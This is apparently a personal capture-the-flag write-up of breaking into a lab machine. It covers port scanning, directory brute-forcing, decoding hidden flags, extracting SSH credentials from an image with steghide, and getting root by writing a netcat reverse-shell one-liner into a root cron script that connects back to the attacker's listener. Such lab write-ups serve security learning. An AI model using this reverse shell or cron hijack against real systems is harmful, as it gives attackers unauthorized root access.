# nmap
```
root@kali:~# nmap -sV -sC -T5 -p- 10.10.21.29
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-03 14:02 UTC
Nmap scan report for ip-10-10-21-29.eu-west-1.compute.internal (10.10.21.29)
Host is up (0.0070s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    nginx 1.16.1
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: nginx/1.16.1
|_http-title: Welcome to nginx!
6498/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 30:4a:2b:22:ac:d9:56:09:f2:da:12:20:57:f4:6c:d4 (RSA)
|   256 bf:86:c9:c7:b7:ef:8c:8b:b9:94:ae:01:88:c0:85:4d (ECDSA)
|_  256 a1:72:ef:6c:81:29:13:ef:5a:6c:24:03:4c:fe:3d:0b (ED25519)
65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Apache/2.4.43 (Ubuntu)
|_http-title: Apache2 Debian Default Page: It works
MAC Address: 02:91:C6:F5:8F:50 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.25 seconds
root@kali:~#
```

# flag1
```
root@kali:~# gobuster dir -u http://10.10.21.29 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php,zip
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.21.29
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     html,txt,php,zip
[+] Timeout:        10s
===============================================================
2020/08/03 14:06:06 Starting gobuster
===============================================================
/index.html (Status: 200)
/robots.txt (Status: 200)
/hidden (Status: 301)


```

```
root@kali:~# gobuster dir -u http://10.10.21.29/hidden/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.t
xt -x html,txt,php,zip
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.21.29/hidden/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     html,txt,php,zip
[+] Timeout:        10s
===============================================================
2020/08/03 14:12:24 Starting gobuster
===============================================================
/index.html (Status: 200)
/whatever (Status: 301)
```
b64
```
ZmxhZ3tmMXJzN19mbDRnfQ==
```


```
User-Agent:*
Disallow:/
Robots Not Allowed
User-Agent:a18672860d0510e5ab6699730763b250
Allow:/
This Flag Can Enter But Only This Flag No More Exceptions
```

md5

# flag3
- http://10.10.21.29:65524/
```
They are activated by symlinking available configuration files from their respective Fl4g 3 : flag{9fdafbd64c47471a8f54cd3fc64cd312} *-available/ counterparts.
```


```
   <div class="main_page">
      <div class="page_header floating_element">
        <img src="/icons/openlogo-75.png" alt="Debian Logo" class="floating_element"/>
        <span class="floating_element">
          Apache 2 It Works For Me
	<p hidden>its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu</p>
        </span>
      </div>
```
b62





# 
```
<html>
<head>
<title>random title</title>
<style>
	body {
	background-image: url("https://cdn.pixabay.com/photo/2018/01/26/21/20/matrix-3109795_960_720.jpg");
	background-color:black;


	}
</style>
</head>
<body>
<center>
<img src="binarycodepixabay.jpg" width="140px" height="140px"/>
<p>XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</p>
</center>
</body>
</html>
```

gost hash
https://md5hashing.net/hash
i don't know why but my chrome dosen't work it
so i use another browser





```
root@kali:~# wget http://10.10.201.133:65524/n0th1ng3ls3m4tt3r/binarycodepixabay.jpg
--2020-08-06 12:02:52--  http://10.10.201.133:65524/n0th1ng3ls3m4tt3r/binarycodepixabay.jpg
Connecting to 10.10.201.133:65524... connected.
HTTP request sent, awaiting response... 200 OK
Length: 90158 (88K) [image/jpeg]
Saving to: ‘binarycodepixabay.jpg’

binarycodepixabay.jpg             100%[===========================================================>]  88.04K  --.-KB/s    in 0s

2020-08-06 12:02:52 (182 MB/s) - ‘binarycodepixabay.jpg’ saved [90158/90158]

root@kali:~# steghide extract -sf binarycodepixabay.jpg
Enter passphrase:
wrote extracted data to "secrettext.txt".
root@kali:~# cat secrettext.txt
username:boring
password:
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx01001 01101110 01100001 01110010 01111001
root@kali:~#
```

- http://web-apps.nbookmark.com/ascii-converter/

```
oot@kali:~# ssh boring@10.10.201.133
ssh: connect to host 10.10.201.133 port 22: Connection refused
root@kali:~# ssh boring@10.10.201.133 -p 6498
The authenticity of host '[10.10.201.133]:6498 ([10.10.201.133]:6498)' can't be established.
ECDSA key fingerprint is SHA256:hnBqxfTM/MVZzdifMyu9Ww1bCVbnzSpnrdtDQN6zSek.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.201.133]:6498' (ECDSA) to the list of known hosts.
*************************************************************************
**        This connection are monitored by government offical          **
**            Please disconnect if you are not authorized              **
** A lawsuit will be filed against you if the law is not followed      **
*************************************************************************
boring@10.10.201.133's password:
You Have 1 Minute Before AC-130 Starts Firing
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
!!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!
You Have 1 Minute Before AC-130 Starts Firing
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
!!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!
boring@kral4-PC:~$ ls -al
total 40
drwxr-xr-x 5 boring boring 4096 Jun 15 12:42 .
drwxr-xr-x 3 root   root   4096 Jun 14 16:04 ..
-rw------- 1 boring boring    2 Aug  6 05:06 .bash_history
-rw-r--r-- 1 boring boring  220 Jun 14 16:04 .bash_logout
-rw-r--r-- 1 boring boring 3130 Jun 15 12:42 .bashrc
drwx------ 2 boring boring 4096 Jun 14 16:06 .cache
drwx------ 3 boring boring 4096 Jun 14 16:06 .gnupg
drwxrwxr-x 3 boring boring 4096 Jun 14 22:36 .local
-rw-r--r-- 1 boring boring  807 Jun 14 16:04 .profile
-rw-r--r-- 1 boring boring   83 Jun 14 16:32 user.txt
boring@kral4-PC:~$ cat user.txt
User Flag But It Seems Wrong Like It`s Rotated Or Something
synt{xxxx}
```

rot


```
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

* *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh
```

```
boring@kral4-PC:/var/www$ vi .mysecretcronjob.sh
boring@kral4-PC:/var/www$ cat .mysecretcronjob.sh
#!/bin/bash
# i will run as root
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.90.14 1234 >/tmp/f
boring@kral4-PC:/var/www$
```

```
root@kali:~# nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.10.90.14] from (UNKNOWN) [10.10.201.133] 59320
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# cd /root
# ls -al
total 40
drwx------  5 root root 4096 Jun 15 12:40 .
drwxr-xr-x 23 root root 4096 Jun 15 01:08 ..
-rw-------  1 root root  883 Jun 15 14:24 .bash_history
-rw-r--r--  1 root root 3136 Jun 15 12:40 .bashrc
drwx------  2 root root 4096 Jun 13 15:40 .cache
drwx------  3 root root 4096 Jun 13 15:40 .gnupg
drwxr-xr-x  3 root root 4096 Jun 13 15:44 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   39 Jun 15 01:01 .root.txt
-rw-r--r--  1 root root   66 Jun 14 21:48 .selected_editor
# cat .root.txt
```
